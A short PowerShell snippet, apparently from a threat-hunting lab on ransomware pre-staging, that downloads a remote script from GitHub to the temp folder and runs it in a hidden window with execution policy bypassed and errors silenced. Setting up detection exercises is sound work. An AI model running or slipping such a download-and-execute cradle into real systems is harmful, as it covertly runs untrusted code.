$u='https://raw.githubusercontent.com/kevlo-cyber/threat-hunting-scenario-ransomware-pre-staging-activity/main/invoke-lab-stig-misconfig.ps1'
$t="$env:TEMP\m.ps1"
Invoke-WebRequest -Uri $u -UseBasicParsing -OutFile $t -ErrorAction SilentlyContinue
Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File `"$t`""
